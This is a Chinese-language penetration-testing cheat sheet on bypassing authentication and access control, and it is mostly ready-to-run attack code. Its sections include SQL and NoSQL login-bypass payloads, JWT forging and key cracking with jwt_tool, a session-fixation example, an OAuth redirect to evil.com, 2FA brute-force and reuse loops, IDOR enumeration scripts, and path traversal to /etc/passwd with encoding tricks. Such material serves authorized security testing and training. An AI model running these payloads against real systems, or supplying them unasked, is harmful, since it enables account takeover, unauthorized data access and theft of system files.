---
id: 03-009
title: "🔐 认证绕过与权限绕过 (Authentication Bypass & Authorization Bypass)"
category: 漏洞利用
category_en: Exploitation
difficulty: ★★★
tools: "JWT_Tool, Burp Suite, 自定义脚本"
last_updated: 2025-07
tags: ["exploitation", "web-attack", "sql-injection", "penetration-testing", "metasploit"]
subdomain: exploitation
nist_csf: ["DE.CM-08", "PR.IP-12"]
mitre_attack: ["T1190", "T1505", "T1203", "T1210"]
---
# 🔐 认证绕过与权限绕过 (Authentication Bypass & Authorization Bypass)

## 概述
绕过身份验证和访问控制机制，获取未授权的系统或数据访问权限。

## 核心技能

### 1. 登录认证绕过

**SQL注入绕过：**
```bash
# 万能密码
admin' OR '1'='1'--' 
admin' OR 1=1--
admin' UNION SELECT 1,'hash','admin'--
' OR 1=1 LIMIT 1--
' OR '1'='1' LIMIT 1--
' OR 1=1#

# 利用注释
admin'--
admin'/*
admin'#
```

**NoSQL绕过：**
```bash
# MongoDB JSON注入
curl -s -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# MongoDB数组注入
curl -s -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": ""}}'
```

### 2. JWT攻击

```bash
# JWT结构解析
# Header: {"alg": "HS256", "typ": "JWT"}
# Payload: {"sub": "1234567890", "name": "admin", "iat": 1516239022}
# Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)

# 算法混淆攻击 (alg: none)
jwt_tool "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature" -X a

# 密钥爆破（HMAC算法）
jwt_tool jwt.txt -C -d /usr/share/wordlists/rockyou.txt

# RS256转HS256混淆
jwt_tool jwt.txt -X k -pk public_key.pem

# JWK注入
jwt_tool jwt.txt -X i

# 修改payload
python3 << 'EOF'
import base64
import json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.signature"
header, payload, sig = token.split('.')

# 解码payload并修改
payload_decoded = json.loads(base64.b64decode(payload + '=='))
payload_decoded['role'] = 'admin'
payload_decoded['is_admin'] = True

# 重新编码
new_payload = base64.b64encode(json.dumps(payload_decoded).encode()).decode().rstrip('=')
print(f"New token: {header}.{new_payload}.{sig}")
EOF
```

### 3. 会话管理攻击

```bash
# 会话固定
# 获取一个有效的会话ID，然后在社工中让受害者使用该会话
curl -s -I "https://example.com/login?sessionid=attacker_session_id" | grep "Set-Cookie"

# Cookie属性绕过
# 检查是否有HttpOnly、Secure、SameSite标记
curl -s -I https://example.com | grep -i "set-cookie"

# 会话令牌预测
for i in {1..1000}; do
  echo "Session ID test: $i"
  curl -s -b "sessionid=$i" https://example.com/profile | grep -i "welcome\|admin"
done
```

### 4. OAuth 2.0/SSO绕过

```bash
# 重定向URI绕过
curl -s -G "https://oauth.example.com/authorize" \
  --data-urlencode "response_type=code" \
  --data-urlencode "client_id=app123" \
  --data-urlencode "redirect_uri=https://evil.com/callback" \
  --data-urlencode "state=test"

# CSRF参数绕过
# 将state参数改为固定值
curl -s -G "https://oauth.example.com/authorize" \
  --data-urlencode "response_type=code" \
  --data-urlencode "client_id=app123" \
  --data-urlencode "redirect_uri=https://app.example.com/callback" \
  --data-urlencode "state=attacker_controlled"

# Token劫持
# 使用referer头检查是否存在泄露
curl -s -H "Referer: https://evil.com" \
  "https://api.example.com/userinfo" \
  -H "Authorization: Bearer victim_token_here"
```

### 5. 2FA绕过

```bash
# 直接跳过2FA验证
curl -s -X POST https://example.com/login \
  -d "username=admin&password=pass&2fa_skip=true"

# 重用旧的2FA代码（时间窗口攻击）
# 收集多个2FA代码，看是否能重复使用
for code in $(cat collected_2fa_codes.txt); do
  response=$(curl -s -X POST https://example.com/2fa -d "code=$code")
  if [[ "$response" =~ "Welcome" || "$response" =~ "Dashboard" ]]; then
    echo "[+] Reusable 2FA code found: $code"
  fi
done

# 响应操控（修改2FA完成状态）
curl -s -X POST https://example.com/verify \
  -H "Content-Type: application/json" \
  -d '{"code": "123456", "verified": true}'  # force verified=true

# 暴力破解2FA代码
# 许多应用使用6位数字码，可尝试爆破
python3 << 'EOF'
import requests
for i in range(0, 1000000, 100):  # 分段测试
    code = str(i).zfill(6)
    r = requests.post("https://example.com/2fa", data={"code": code})
    if r.status_code == 200 and "invalid" not in r.text.lower():
        print(f"[+] Valid code: {code}")
        break
EOF
```

### 6. 越权访问 (IDOR)

```bash
# 水平越权 - 访问同级用户资源
curl -s "https://api.example.com/users/1001/profile"
curl -s "https://api.example.com/users/1002/profile"
curl -s "https://api.example.com/users/1003/profile"

# 垂直越权 - 低权限用户访问管理功能
curl -s -b "session=user123" "https://example.com/admin/users"
curl -s -b "session=user123" "https://api.example.com/v1/admin/settings"

# IDOR批量枚举
for uid in {1..100}; do
  response=$(curl -s "https://api.example.com/users/$uid/orders" -b "session=user123")
  if [ "$response" != "[]" ] && [ "$response" != '{"error":"Forbidden"}' ]; then
    echo "[+] Accessed user $uid data"
    echo "$response" | head -c 200
  fi
done

# 参数篡改
curl -s "https://api.example.com/order/ORD-2024-001/receipt?admin=true"
curl -s "https://api.example.com/order/ORD-2024-001/receipt?role=admin"
curl -s -H "X-Role: admin" "https://api.example.com/order/ORD-2024-001/receipt"

# UUID枚举
# 某些应用使用可预测的UUID
curl -s "https://api.example.com/reset-password?token=550e8400-e29b-41d4-a716-446655440001"
```

### 7. 路径遍历绕过

```bash
# 基础路径遍历
curl -s "https://example.com/download?file=../../../etc/passwd"
curl -s "https://example.com/download?file=..\\..\\..\\windows\\win.ini"

# 编码绕过
curl -s "https://example.com/download?file=..%252f..%252f..%252fetc/passwd"  # 双重URL编码
curl -s "https://example.com/download?file=..%c0%ae..%c0%ae..%c0%aetcp/passwd"  # Unicode编码

# 截断绕过 (%00)
curl -s "https://example.com/download?file=../../../etc/passwd%00.jpg"

# 绝对路径
curl -s "https://example.com/download?file=/etc/passwd"

# 路径穿越 + ZIP符号链接
# 创建包含符号链接的ZIP文件
ln -s /etc/passwd link
zip --symlinks malicious.zip link
```

## 认证绕过检查清单

| 检查项 | 测试方法 |
|:---|:---|
| 默认凭证 | admin/admin, root/root, test/test |
| SQL注入绕过 | ' OR 1=1--, admin'-- |
| 响应篡改 | 修改状态码/JSON响应 |
| Cookie操纵 | 修改Cookie中的角色参数 |
| 目录直接访问 | /admin, /dashboard绕过登录 |
| 参数污染 | id=1&id=2&id=admin |
| 缓存投毒 | 修改Host头 |
| SSL绕过 | HTTP -> 重定向到HTTPS |
| JWT算法混淆 | alg: none, RS256->HS256 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| jwt_tool | JWT攻击测试 | https://github.com/ticarpi/jwt_tool |
| jwt-cracker | JWT密钥爆破 | https://github.com/lmammino/jwt-cracker |
| Burp Intruder | 参数枚举/爆破 | https://portswigger.net/burp |
| Hydra | 在线密码爆破 | https://github.com/vanhauser-thc/thc-hydra |
| ffuf | 模糊测试/爆破 | https://github.com/ffuf/ffuf |

## 参考资源
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Authorization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [JWT Attack Cheatsheet](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [PortSwigger - Access Control](https://portswigger.net/web-security/access-control)
